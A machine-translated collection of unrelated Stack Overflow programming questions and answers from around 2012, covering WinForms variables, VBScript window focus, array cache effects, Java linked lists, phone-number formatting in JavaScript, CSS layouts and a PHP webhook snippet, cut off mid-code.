如果要从表单中的任何其他方法访问它们，则需要将 dataTypeKey 和 ACTFCSTtext 变量声明为 Form 对象的实例变量。如果您想将它们与其他形式一起使用，您可以将它们作为构造函数参数传递，或者设置所述其他形式的某些属性。

因此，如果您希望它们成为实例变量，您可以在类声明之后声明它们。它们仍然应该是私有的，这意味着它们只能从您的 frmLoadACTFCST 类中访问。

```
public partial class frmLoadACTFCST : Form
{
    private string ACTFCSTtext = "";
    private int dataTypeKey = 0;
... 
```

编辑：如果您想从不同对象（或静态类）中的一个对象访问变量，您的选项如下...

1) 将您的变量声明为公共实例变量（如上所示，但公共的；当您为它们提供 getter 和 setter 方法时，这些被称为属性）。需要访问这些变量的类需要引用拥有这些变量的类。

示例：FormA 有一个名为 SomeString 的公共属性。FormB 需要访问 SomeString。FormB 需要对 FormA 的引用，并将访问变量作为...

```
formAReference.SomeString 
```

2) 将变量的值作为参数传递给需要访问的类的某个方法。

示例：FormA 有一个名为 SomeString 的私有实例变量。FormB 需要访问 SomeString。如果 FormA 实例化 FormB，它可以将 SomeString 的值传递给 FormB 的构造函数...

```
//From within FormA's code
FormB formB = new FormB(SomeString);

//FormB's constructor
public FormB(string someString)
{
    this.someString = someString;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:53:04.757

也许有更聪明的方法来做到这一点。

```
public partial class frmLoadACTFCST : Form
{
    public frmLoadACTFCST()
    {
        InitializeComponent();

        actfcst = ACTFCST.ACT;
        btnActual.Tag = ACTFCST.ACT;
        btnActual.Checked = true;
        btnForecast.Tag = ACTFCST.FCST; 
        btnPlan.Tag = ACTFSCT.PLAN;
        btn5YrPlan2012.Tag = ACTFCST.FiveYearPlan2012;
    }

    public enum ACTFCST
    {
        ACT = 1,
        FCST = 2,
        PLAN = 3,
        FiveYearPlan2012=4
    }

    public static ACTFCST actfcst { get; private set; }

    private void CheckedChanged(object sender, EventArgs e)
    {
        // All the buttons uses this Click-event.
        actfcst = (sender as Button).Tag as ACTFCST;
    }

    private void btnContinue_Click(object sender, EventArgs e)
    {
        MessageBox.Show(actfcst.ToString());
        Close();
    }
} 
```

关键是所有按钮在单击时都会调用 CheckedChanged。

使用静态意味着其他人可以使用如下方式访问该值：

```
frmLoadACTFCST.ACTFCST value = frmLoadACTFCST.actfcst;
// Do something based on value. 
```

我希望这对你的追求有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:29:20.610

如果您在设计视图中选择一个控件，属性窗口将包含一个名为“Modifiers”的项目。您可以在此处公开控件。

更好的方法是在您的表单上创建一个新的公共属性，该属性会产生当前选定单选按钮的值。

# button - VBS脚本将程序带到前面

> ID：13093152
> 
> 赞同：3
> 
> 时间：2012-10-26T19:25:08.507
> 
> 标签：button, vbscript, click, window

我正在编写 VBS 代码来打开 Internet Explorer 并转到 www.google.com 但是当我运行该程序时，它会打开并导航到 www.yahoo.com 但 Internet Explorer 不是前窗口。谁能帮我这个？有没有我可以用来将 Internet Explorer 带到最前面的代码？谢谢你们！这是我的代码：

```
Option Explicit
 Dim ie

Set ie = CreateObject("InternetExplorer.Application")

ie.Navigate("wwww.yahoo.com") 
```

最后一个问题 - 有没有我可以用来点击某个按钮的代码 - 特别是我无法通过按“tab”到达的按钮？

谢谢你们！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T12:28:14.430

试试这个：

```
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "http://www.yahoo.com/"
Do While ie.Busy : WScript.Sleep 100 : Loop
ie.Visible = True
CreateObject("WScript.Shell").AppActivate ie.document.title 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-14T21:49:31.380

我发现在调用 AppActivate 方法***后将Visible 属性设置为 True 可以@daniel-cook。***

因此，只需交换@ansgar-wiechers 示例中的最后两行即可产生所需的结果。

```
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "http://www.yahoo.com/"
Do While ie.Busy : WScript.Sleep 100 : Loop
CreateObject("WScript.Shell").AppActivate ie.document.title
ie.Visible = True 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:38:16.713

这适用于我的电脑，它打开 IE 并加载 www.google.com：

```
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run ("iexplore www.google.com") 
```

至于你的最后一个问题......可能，但你需要更具体，并且可能应该问一个不同的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-10-14T23:01:27.497

使用该`wscript.sleep()`功能。应该可以，因为这可以在记事本上使用。

# c++ - c++ 2d数组访问速度根据[a][b]顺序变化？

> ID：13093155
> 
> 赞同：11
> 
> 时间：2012-10-26T19:25:16.900
> 
> 标签：c++, arrays, multidimensional-array

> **可能重复：**
> [为什么我的程序在恰好循环 8192 个元素时很慢？](https://stackoverflow.com/questions/12264970/why-is-my-program-slow-when-looping-over-exactly-8192-elements)

我一直在修改我用来简单地对二维数组的元素求和的程序。一个错字导致了至少在我看来，一些非常奇怪的结果。

处理数组时，matrix[SIZE][SIZE]：

```
for(int row = 0; row < SIZE; ++row)
    for(int col = 0; col < SIZE; ++col)
        sum1 += matrix[row][col]; 
```

运行非常快，但是上面的行 sum1... 被修改：

```
sum2 += matrix[col][row] 
```

正如我在没有意识到的情况下偶然发生的那样，我注意到我的运行时间显着增加。为什么是这样？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-10-26T19:28:15.537

这是由于您的程序的缓存行为。

数组只是连续的内存块，因此当您访问 [row][column] 时，您正在按顺序访问内存。这意味着您正在访问的数据页面在同一页面上，因此访问速度要快得多。

当您执行 [column][row] 时，您不再按顺序访问该内存，因此您最终会遇到更多缓存未命中，因此您的程序运行速度会慢得多。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-26T19:31:21.480

`matrix[row][col]`和的内存位置`matrix[row][col + 1]`是相邻的。

`matrix[row][col]`和的内存位置`matrix[row + 1][col]`由项目的 SIZE 数量分隔。

计算机喜欢按顺序访问内存**而**不是**随机**访问，因此相邻访问速度更快。打个比方想想硬盘的性能，顺序读/写总是比随机读/写好。这与您的 CPU 如何缓存内存并尝试预测您接下来需要什么有关。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-26T19:28:30.513

这是因为在更快的情况下，当您以线性方式迭代时，CPU 的内存预取实际上很有用。在缓慢的情况下，您在内存中跳跃，因此预取几乎没有影响，因为数据不太可能在缓存中。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-10-26T19:30:05.973

这取决于矩阵的排序方式。您正在以行优先或列优先访问数组。取决于它在内存中的存储方式，两者之间的速度会有所不同

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2012-10-26T19:44:46.017

二维数组只是指向指针的指针。所以它看起来像

```
[*p][*p][*p]
  |   |   |
  v   v   v
 [d] [d] [d]
 |a| |a| |a|
 |t| |t| |t|
 [a] [a] [a] 
```

因此，当您在非主阵列上调用数据（此指针指示的内容）时，您的操作系统会将其放入 CPU 缓存。

# android - 多次更改相对布局的高度

> ID：13093163
> 
> 赞同：2
> 
> 时间：2012-10-26T19:25:48.610
> 
> 标签：android

我正在使用以下代码来更改包含列表视图的相对布局的高度。我第一次调用它时它工作正常，但如果我稍后再次调用相同的代码以将高度更改为不同的值，它什么也不做。为什么会这样，我该如何让它发挥作用？

```
LayoutParams params = myrelativelayout.getLayoutParams(); 
params.height = newHeight; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:30:54.577

尝试添加 myrelativelayout.setLayoutParams(params); 每次你改变它。这将确保视图每次都无效并且您更新视图的实际参数对象。

# c++ - 静态链接glew时链接器退出

> ID：13093173
> 
> 赞同：3
> 
> 时间：2012-10-26T19:26:52.657
> 
> 标签：c++, linker, mingw, glew, gcc4.7

将 glew-1.9.0 与我的项目静态链接时遇到问题。

```
collect2.exe: error: ld returned 5 exit status 
```

对于可能的最小测试，只需创建一个 OpenGL 上下文（通过 SFML 2）并初始化 glew，链接器在尝试链接静态库时退出且没有错误消息。

我正在使用带有 gcc 4.7.0 的 MinGW。我在 Eclipse for C++ 和 Code::Blocks 中都发现了同样的问题。从 glew 编译的二进制文件以及我编译自己的静态库并链接到它时，都会出现同样的问题。

但是，当我动态链接或在项目中包含 glew.c 源时，程序链接并正确执行。

我正在使用 GLEW_STATIC 定义，链接到 opengl32，并记住包含库和库的路径。如果我只是删除定义并使用它工作的库的 dll 版本。任何人都知道为什么这可能会失败，或者我该如何解决？

# opencv - 使用 CMake 和 MinGW 的 OpenCV 2.4.2 库文件 - 目标 IDE 代码块

> ID：13093174
> 
> 赞同：0
> 
> 时间：2012-10-26T19:26:53.017
> 
> 标签：opencv, cmake, codeblocks

我在使用 OpenCV 2.4.2 时遇到了这个问题，它并没有真正与 Microsoft VS 2010 Express 一起正确安装；它总是缺少一个或两个 dll 文件，这与我在谷歌上搜索的内容无关。此外，Visual Studio 2010 Express 仅在几天内有效，因此此时 VS 在 OpenCV 上表现不佳是可以接受的。但是，当我将我的 IDE 更改为 CodeBlocks 时，它就更奇怪了，因为现在我缺少 dll 文件，并且由于重复的 .dll 文件而出现“缺少入口点”错误。我找到了本指南并按照它告诉我的操作：

```
http://conanhung.wordpress.com/2012/05/23/opencv-2-2c-codeblocks-and-mingw-got-it-working-on-windows/ 
```

但是还是不行！！我所追求的是在 Windows 7 64 位机器上集成 OpenCV（最好是 2.4.2 版本）的完整而明确的解决方案。我一直在把 Stackoverflow 翻过来，但没有解决方案对我有用。问题是

使用 VISUAL STUDIO 时：缺少 dll 文件（例如 libopencv_core242d.dll 等）

使用代码块时：首先它抱怨缺少 libstdc++-6.dll。当我将它下载到我的 C:\MinGW\libexec\gcc\mingw32\4.7.0 文件夹时，它不再抱怨这个。但是现在它抱怨有任何入口点问题并且缺少其他一些.dll文件！！！

如果有人不择手段地让它发挥作用，我将非常乐意深入了解它是什么。我不相信这样一个重要的库可以如此愚蠢地分发，以至于开发人员不得不日夜奋斗才能完成这项工作。

仅供参考，我什至尝试过 OPenCV 网站，坦率地说，他们的说明有点没用。此外，所有必要的信息，例如添加路径，添加包含和库等。请有人指出我正确的方向，因为已经两天了，我无法到达任何地方。它现在真的停止了我的工作:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T10:26:03.330

作为答案，但可能是一个非常简单的答案，我做了以下事情并解决了这个问题：

1）从PC上完全卸载code::blocks并下载IDE-only版本（即没有MinGW编译器），然后安装它。

2) 下载最新稳定版MinGW，安装，添加C:\MinGW\bin到PATH

[3) 遵循 [链接] http://conanhung.wordpress.com/2012/05/23/opencv-2-2c-codeblocks-and-mingw-got-it-working-on-windows/](http://conanhung.wordpress.com/2012/05/23/opencv-2-2c-codeblocks-and-mingw-got-it-working-on-windows/)的其余说明

4) 可以肯定的是，将 opencv .dll 文件从构建文件夹（即您使用 CMake 创建的“make”和“install”文件）复制到调试（即可执行文件）文件夹。

这将解决问题。以防万一，您可能不需要添加一些环境变量。

# .net - 从 .net 4.0 中的 asp.net 应用程序使用 ladon Web 服务 - 不工作

> ID：13093175
> 
> 赞同：1
> 
> 时间：2012-10-26T19:26:55.210
> 
> 标签：.net, service, web

我有一个让我发疯的问题。我需要连接到这个网络服务：

SOAP 1.1 > [http://monitor.keepitsimple.it/webservice/db_test/soap11/description](http://monitor.keepitsimple.it/webservice/db_test/soap11/description)

SOAP 1.2 > [http://monitor.keepitsimple.it/webservice/db_test/soap/description](http://monitor.keepitsimple.it/webservice/db_test/soap/description)

来自我用 c# 编写的 asp.net (.net 4.0) 应用程序。

此 Web 服务有 3 种方法：

`check_login()`- 这在我的应用程序中运行良好

`get_corsista()`- 这在我的应用程序中运行良好

`get_corsisti()`- 那是行不通的，这是问题

调用此方法我没有收到任何错误，但结果为空。如果我尝试使用 SOAP 客户端（Firefox 插件 SOA 客户端）测试 Web 服务，一切正常...

# ant - 阿帕奇蚂蚁探查器

> ID：13093181
> 
> 赞同：9
> 
> 时间：2012-10-26T19:27:24.110
> 
> 标签：ant, profiling, profiler

是否有一个`Ant`分析器可以运行我的 ant 脚本并告诉我完成目标、任务和操作需要多长时间？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-26T20:33:08.293

Ant 有两个相关的特性来允许监控构建过程 => [listeners 和 loggers](http://ant.apache.org/manual/listeners.html)：

*   Ant >= 1.8.x 附带[ProfileLogger](http://ant.apache.org/manual/listeners.html#ProfileLogger)
*   [Ant statistics](http://code.google.com/p/antstatistics/)，一个记录所有目标执行时间的记录器，并随时间绘制它们
*   [来自 antcontrib 的性能监视器](http://ant-contrib.sourceforge.net/tasks/tasks/performance_monitor.html)，一个监听器，用于跟踪每个目标和任务执行所需的时间并打印最终摘要

或者[自己写](http://ant.apache.org/manual/develop.html#buildevents)。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2018-10-11T19:11:13.873

YourKit YouMonitor 能够分析 Ant、Maven、Gradle 和许多其他构建工具[https://www.yourkit.com/youmonitor/](https://www.yourkit.com/youmonitor/)

免责声明：我为 YourKit 工作

# java - 链表添加节点不起作用

> ID：13093185
> 
> 赞同：0
> 
> 时间：2012-10-26T19:27:34.777
> 
> 标签：java, linked-list

我正在尝试创建一种将节点添加到我的链表的方法。该方法需要一个 int（指定新链接应该去哪里）和 String（因为我的链表包含字符串）。我写了一些我认为会在我的列表中的特定点添加一个链接的代码，但是当我在应该添加一个新节点之后打印我的列表时，我看到新节点尚未添加。我很惊讶，因为我在编写代码时非常小心地测试了代码的行为，并且 add 方法似乎符合我的预期——但是新打印的列表并没有反映添加新链接后的更改. 谁能告诉我哪里出错了：/

ps：类名和方法名不讨论，我老师选的，所以必须保留。

谢谢！

## 测试链表

```
class LinkedListTest 
{
    public static void main(String[] args) 
    {
            LinkedList list = new LinkedList();

            list.insertFirst("cat");
            list.insertFirst("dog");
            list.insertFirst("fish");
            list.insertFirst("cow");
            list.insertFirst("horse");
            list.insertFirst("pig");
            list.insertFirst("chicken");

            list.add(3, "mouse");

            list.print();
    }   
} 
```

## 链表类

```
public class LinkedList 
{
    private Link first;

    public LinkedList() 
    {
        first = null;
    }

    public void insertFirst(String word)
    {
           Link link = new Link(word);
           link.next = first;
           first = link;

           System.out.print(first.item + " ");
    }

    public String deleteFirst()
    {   
        Link temp = first;
        first = first.next;
        return temp.item;
    }

    public String get(int index)
    {
        Link current = first;
        while (index > 0) 
         {
             index--;
             current = current.next;
         }

         return current.item;           
    }

    public void add(int index , String someString)
    {

        Link current = first;

        while (index>0)
        {
            index--;
            current = current.next;
        }

    Link newLink = new Link(someString);
    newLink.next = current;
    current = newLink;

    }

    public void print()
    {
        System.out.println("-----------PRINTING LIST------------");
        Link current = first;
        while(!(current==null))
        {
            System.out.println(current.item);
            current = current.next;
        }
    }
} 
```

## 链接类

```
public class Link 
{   
    public String item;
    public Link next;

    public Link(String theItem) 
    {
        item = theItem;
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:38:30.263

当插入这样的列表时。您将不得不设置两个“下一个”链接。next 指向您正在插入的项目， next 指向您正在插入的项目，指向您正在滑过的项目。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T19:38:58.280

查看将 newLink 添加到当前列表的位置。提示......你不是。您更新`current`，这是一个指向 newLink 的局部变量，但您从未将 newLink 设置为`next`当前链接列表中实际存在的任何内容。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-26T19:42:22.560

```
newLink.next = current;
current = newLink; 
```

`add`您的类方法中的上述代码`LinkedList`应为：-

```
newLink.next = current.next;
current.next = newLink
current = newLink; 
```

我希望这可以解决您的问题。您需要设置两个下一个链接以在中间插入一个节点。一个在当前节点指向下一个节点，一个在前一个节点指向当前节点。

# ajax - 在 Razor 视图上调用 ajax 后显示模型状态错误

> ID：13093186
> 
> 赞同：15
> 
> 时间：2012-10-26T19:27:36.913
> 
> 标签：ajax, asp.net-mvc-3, validation

我对 @Html.ValidationMessageFor 助手和 jquery 不显眼的验证设置有剃刀视图。

我想调用控制器/动作，并通过使用已设置的相同验证逻辑来​​显示动作返回的最终模型状态错误。

我已经编写了一些代码，但我想知道是否已经有办法自动执行它，即如果我将 HTTP Bad Request 作为 AJAX 响应捕获，我想从响应正文中取出模型状态错误并将它们插入不显眼的验证。

我正在寻找完整的推荐解决方案，而不是解决方法:)

谢谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-10-26T21:10:31.540

您可以返回带有`Json`结果的错误（[如何从 asp.net mvc modelState 获取所有错误？](https://stackoverflow.com/questions/1352948/how-to-get-all-errors-from-asp-net-mvc-modelstate)）：

```
var allErrors = ModelState.Values.SelectMany(v => v.Errors); 
```

然后手动显示错误。获取表单验证器：

```
var validator = $("form").validate(); 
```

然后检查您的字段是否已正确初始化，例如您可以查看此处（可选步骤）：

```
validator.settings.rules 
```

或者

```
validator.settings.messages 
```

如果一切正常，那么您可能会显示错误：

```
validator.showErrors({"Password": "Too simple!"}); 
```

`Password`字段名称在哪里，`Too simple!`是错误消息。

# javascript - 电话号码中的 Javascript 破折号

> ID：13093187
> 
> 赞同：16
> 
> 时间：2012-10-26T19:27:40.250
> 
> 标签：javascript

我试图研究这个问题的答案，但我迷路了。我正在尝试制作一个自动在电话号码中添加破折号的搜索栏。我已经解决了。

下一部分是具有挑战性的部分。我怎样才能让它总是做 XXX-XXX-XXXX，即使粘贴的字符是 555 555 1212 或 555---555-1212，它只会卷回数字并输出 55​​5-555-1212。它不应该将空格或额外的破折号算作一个字符。

我发现：[http ://www.jotform.com/answers/15202-can-I-add-script-to-my-form-that-will-automatically-add-hyphens-in-between-the-3-digit -区号和三位数前缀](http://www.jotform.com/answers/15202-can-I-add-script-to-my-form-that-will-automatically-add-hyphens-in-between-the-3-digit-area-code-and-also-the-3-digit-prefix)

我通过添加以下内容对其进行了一些更改：

```
<SCRIPT LANGUAGE="JavaScript">
        function addDashes(f)
            {
                f.value = f.value.slice(0,3)+"-"+f.value.slice(3,6)+"-"+f.value.slice(6,15);
            }
    </SCRIPT>

<input id="input_4" class="form-textbox" maxlength="15" name="atn" size="25" onBlur='addDashes(this)' /> 
```

目前，这只有在用户输入 5555555555 并自动将其转换为 555-555-5555 时才有效。我试图弄清楚如何将 5-55555-5555 之类的东西变成 555-555-5555。目前，它是 5-5-555-5-5555。

看到我的困境了吗？哈哈。它不能是 php 或任何服务器端脚本，因为它必须能够在桌面上运行。

* * *

解析度：

```
<SCRIPT LANGUAGE="JavaScript">
        function addDashes(f)
            {
                f.value = f.value.replace(/\D/g, '');

                f.value = f.value.slice(0,3)+"-"+f.value.slice(3,6)+"-"+f.value.slice(6,15);
            }
    </SCRIPT> 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-10-26T19:32:10.767

首先，通过删除所有不是数字的字符来清理您的输入（参考：[Regex 以替换除数字和小数点以外的所有内容](https://stackoverflow.com/questions/4572194/regex-to-replace-everything-except-numbers-and-a-decimal-point)）

然后，你把你的破折号。

```
function addDashes(f)
{
    f_val = f.value.replace(/\D[^\.]/g, "");
    f.value = f_val.slice(0,3)+"-"+f_val.slice(3,6)+"-"+f_val.slice(6);
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-10-26T19:39:04.570

我强烈倾向于将电话号码视为 10 位数字的直字符串，没有格式（因此我可以根据需要即时对它们应用格式，因此搜索和比较更简单），尽管如果我这样做可能会改变永远不得不处理国际电话号码。如果您要处理的只是美国电话号码，这将很好地工作（在键入时对其进行格式化）：

```
function addDashes(f) {
    var r = /(\D+)/g,
        npa = '',
        nxx = '',
        last4 = '';
    f.value = f.value.replace(r, '');
    npa = f.value.substr(0, 3);
    nxx = f.value.substr(3, 3);
    last4 = f.value.substr(6, 4);
    f.value = npa + '-' + nxx + '-' + last4;
}​ 
```

这是一个小提琴：http: [//jsfiddle.net/EYuk5/](http://jsfiddle.net/EYuk5/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-11T21:41:47.283

这是一个小提琴：[https](https://jsfiddle.net/v9gq5jkw/) ://jsfiddle.net/v9gq5jkw/ 。

```
<input id="phone"> 
```

```
function phone_formatting(ele, restore) {
  var new_number,
    selection_start = ele.selectionStart,
    selection_end = ele.selectionEnd,
    number = ele.value.replace(/\D/g, '');

  if (number.length > 2) {
    new_number = number.substring(0, 3) + '-';
    if (number.length === 4 || number.length === 5) {
      new_number += number.substr(3);
    } else if (number.length > 5) {
      new_number += number.substring(3, 6) + '-';
    }
    if (number.length > 6) {
      new_number += number.substring(6);
    }
  } else {
    new_number = number;
  }

  ele.value = (new_number.length > 12) ? new_number.substring(0, 12) : new_number;

  if (new_number.slice(-1) === '-' && restore === false &&
    (new_number.length === 8 && selection_end === 7) ||
    (new_number.length === 4 && selection_end === 3)) {
    selection_start = new_number.length;
    selection_end = new_number.length;
  } else if (restore === 'revert') {
    selection_start--;
    selection_end--;
  }
  ele.setSelectionRange(selection_start, selection_end);

}

function phone_number_check(field, e) {
  var key_code = e.keyCode,
    key_string = String.fromCharCode(key_code),
    press_delete = false,
    dash_key = 189,
    delete_key = [8, 46],
    direction_key = [33, 34, 35, 36, 37, 38, 39, 40],
    selection_end = field.selectionEnd;

  if (delete_key.indexOf(key_code) > -1) {
    press_delete = true;
  }

  if (key_string.match(/^\d+$/) || press_delete) {
    phone_formatting(field, press_delete);
  } else if (direction_key.indexOf(key_code) > -1) {} else if (dash_key === key_code) {
    if (selection_end === field.value.length) {
      field.value = field.value.slice(0, -1)
    } else {
      field.value = field.value.substring(0, (selection_end - 1)) + field.value.substr(selection_end)
      field.selectionEnd = selection_end - 1;
    }
  } else {
    e.preventDefault();
    phone_formatting(field, 'revert');
  }

}

document.getElementById('phone').onkeyup = function(e) {
  phone_number_check(this, e);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-16T15:12:21.590

我做了这个

```
function addDashesToNumber(number){
    const numWithoutDashes = number.replace(/[^0-9]/g, '')
    if(numWithoutDashes.length > 10) return number.slice(0, -1)
    const dashPlaces = [3, 6]
    return numWithoutDashes
                .split('')
                .reduce((acc, curr, i) => dashPlaces.includes(i) ? [...acc, '-', curr] : [...acc, curr], [])
                .join('')
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-04T11:30:40.337

尝试这个：

```
 function dashedNumber(value){
    const afterIndices = [3,6,8]; 
    const length = value.length;
    let newValue = '' 
    for(let i=0; i<length; i++){
      if(afterIndices.includes(i))
        newValue+='-'
      newValue+=value[i];
    }
    return newValue;
  } 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2015-02-23T19:06:40.503

除了添加破折号之外，您还需要处理光标的位置，尤其是在删除的情况下。

这个 AMD 模块正是这样做的：[https ://github.com/whenyoubelieve2014/us-telephone-input](https://github.com/whenyoubelieve2014/us-telephone-input)

# web-services - 如何登录网络服务

> ID：13093190
> 
> 赞同：0
> 
> 时间：2012-10-26T19:28:05.193
> 
> 标签：web-services

一家公司为我们开发了一个网络服务。他们已经向我们发送了 Web 服务的 URL 以及我们需要调用的方法和参数。他们说他们会向我们发送安全的 API 密钥，他们就这样做了。该密钥的格式为：ABCDE_IBMPC_Z12345，但没有其他说明。

我的问题是，他们没有发送任何关于如何使用此安全 API 密钥登录的说明。这是所有 Web 服务的“通用”吗？有人可以告诉我如何使用此密钥进行身份验证和登录，以便我可以调用我需要调用的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:35:11.053

它很可能需要作为查询字符串参数提供......他们应该告诉你参数名称是什么:-)

类似于 ?api_key=ABCDE_IBMPC_Z12345

# asp.net-mvc-3 - 获取 MVC IEnumerable EditorFor 的迭代器

> ID：13093192
> 
> 赞同：1
> 
> 时间：2012-10-26T19:28:14.723
> 
> 标签：asp.net-mvc-3, checkbox

我正在使用 MVC 显示复选框选项表。我知道我可以调用`EditorFor()`对象的集合，它会通过循环遍历集合并根据每个项目的编辑器模板输出 HTML 来生成它们的列表。我的问题是，有没有办法在编辑器模板中访问这个循环的迭代器，这样我就可以每隔 3 列开始一个新的表行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:52:06.490

此外，将项目命名为模型绑定的正确名称很重要。见这篇文章：

[http://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx](http://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:40:12.497

按照以下帖子中的布拉德威尔逊链接，应该是你所追求的。

[如何在 ASP.NET MVC 3 中创建自定义编辑器/显示模板？](https://stackoverflow.com/questions/5497183/how-to-create-custom-editor-display-templates-in-asp-net-mvc-3)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:48:27.400

您可以使用的最简单的方法：

```
 List<string> items = new List<string>();
  items.Add("Item 1");
  items.Add("Item 2");
  items.Add("Item 3");

  var result = items.Select((item, index) => new { index, item }); 
```

接着`if(index % 3 == 0) { ... }`

或者

[在 ASP.NET MVC 中，有没有办法在使用 EditorTemplates 时获取循环索引？](https://stackoverflow.com/questions/8669704/in-asp-net-mvc-is-there-a-way-to-get-the-loop-index-when-using-editortemplates)

# html - 带边距和动态内容的 100% 高度

> ID：13093194
> 
> 赞同：0
> 
> 时间：2012-10-26T19:28:16.570
> 
> 标签：html, css

我的项目有以下要求：

1.  页眉固定在页面顶部
2.  内容区域具有白色背景和 100% 高度
3.  内容小于屏幕高度时没有滚动条
4.  必须支持 IE7+（IE 的 JS 修复是可以的）
5.  当内容高于屏幕高度时，滚动它应该停留在白色内容区域内（而不是在标题下方）。

这是我的基本 HTML：

```
<div class="wrap">
    <div id="header">header</div>
</div>
<div class="wrap" id="content">content</div>​ 
```

CSS：

```
body{background:#C0DEED url('https://si0.twimg.com/images/themes/theme1/bg.png') repeat-x 0px -80px fixed;}
html,body{height:100%;}
.wrap{width:300px; margin:0 auto;}
#header{position:fixed; background:#aaa; top:10px; width:300px;}
#content{height:100%; background:white; margin-top:40px} 
```

​ 示例：http: [//jsfiddle.net/zw3WS/](http://jsfiddle.net/zw3WS/)

第一个问题是如何让内容具有 100% 的高度，而不是放在标题下方，并且仍然没有不必要的滚动条？

其次，如果内容比屏幕高，我如何让它只在空白处滚动，并且不允许内容像现在一样在 to 栏下滚动？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:42:10.583

对于“仅在空白区域”滚动，您可以通过设置`position: fixed`wrapper 元素，然后将 header 和 content 元素绝对定位在其中：

```
body{
  background:#C0DEED url('https://si0.twimg.com/images/themes/theme1/bg.png') repeat-x 0px -80px fixed;
  overflow: hidden; /* no scrollbars for page body */
}

.wrap {  
  width: 300px;
  position: fixed;
  top: 10px;
  left: 50%; /* for horizontal centering */
  margin-left: -150px; /* for vertical centering */
  bottom: 0;
}

#header{
  position: absolute; 
  background:#aaa; 
  top: 0;
  left: 0;
  right: 0;
}

#content{
  background:white; 
  position: absolute;
  bottom: 0;
  top: 30px;
  left: 0;
  right: 0;
  overflow: auto; /* this makes the scrollbar appear inside #content */
} 
```

演示：http: [//jsbin.com/osipin/1/edit](http://jsbin.com/osipin/1/edit)

* * *

为了在页面正文中滚动，您需要向标记添加两个元素：标题的背景和内容的背景。

标题背景的目的是在向下滚动时遮盖内容，否则它会出现在标题下方。您用来覆盖内容的只是与页面相同的背景。您必须正确调整此 bg 元素的大小，以便它填充视口的宽度，并且是内容区域上边距的高度。真正的标题可以在这个 bg 元素中使用设置的宽度和`margin: 0 auto`.

内容背景元素应该是内容之前的空元素，并且具有固定的位置。其目的是确保即使内容短于视口高度，白色区域也能延伸到页面底部。

您的新 CSS 如下所示：

```
body, .header-bg {
  background:#C0DEED url(https://si0.twimg.com/images/themes/theme1/bg.png) repeat-x 0 -80px fixed;
}

.wrap {
  width:300px;
  margin: 0 auto;
}

.header-bg {
  position: fixed;
  top: 0px;
  left: 0;
  right: 0;
  height: 40px;
}

#header {
  background:#aaa;
  width:300px;
  margin: 10px auto 0;
}

.content-bg {
 background: #FFF;
  position: fixed;
  width: 300px;
  top: 40px;
  bottom: 0;
  z-index: -1;
} 
```

你的新标记是这样的：

```
<div class="wrap">

  <div class="header-bg">
    <div id="header">header</div>
  </div>

  <div class="content-bg"></div>

    <div id="content">
      CONTENT
    </div>

</div> 
```

演示：http: [//jsbin.com/osipin/4/edit](http://jsbin.com/osipin/4/edit)

# c# - 将代码片段从 PHP 转换为 C# 或 VB.NET

> ID：13093195
> 
> 赞同：-3
> 
> 时间：2012-10-26T19:28:16.067
> 
> 标签：c#, php, vb.net, json

我正在尝试将以下代码片段从 PHP 转换为 C# 或 VB.NET 这是来自用于从外部 webhook 捕获 JSON 字符串的 PHP 页面。

```
// Get the POST body from the Webhook and log it to a file for backup purposes...
$request_body = file_get_contents('php://input');
$myFile = "testfile.txt";
$fh = fopen($myFile, 'w') or die("can't open file");
fwrite($fh, $request_body);
fclose($fh);

// Get the values we're looking for from the webhook
$arr = json_decode($request_body);
foreach ($arr as $key => $value) {
    if ($key == 'properties') {
        foreach ($value as $k => $v) {
            foreach ($v as $label => $realval) {
                if ($label == 'value' && $k == 'zip') {
                    $Zip = $realval;                    
                }
                elseif($label == 'value' && $k == 'firstname') {
                    $Fname = $realval;
                }
                elseif($label == 'value' && $k == 'lastname') {
                    $Lname = $realval;
                }
                elseif($label == 'value' && $k == 'email') {
                    $Email = $realval;
                }
                elseif($label == 'value' && $k == 'phone') {
                    $Phone = $realval;
                    $Phone = str_replace("(", "", $Phone);
                    $Phone = str_replace(")", "", $Phone);
                    $Phone = str_replace("-", "", $Phone);
                    $Phone = str_replace(" ", "", $Phone);
                }
                //need the other values as well!
            }
        }
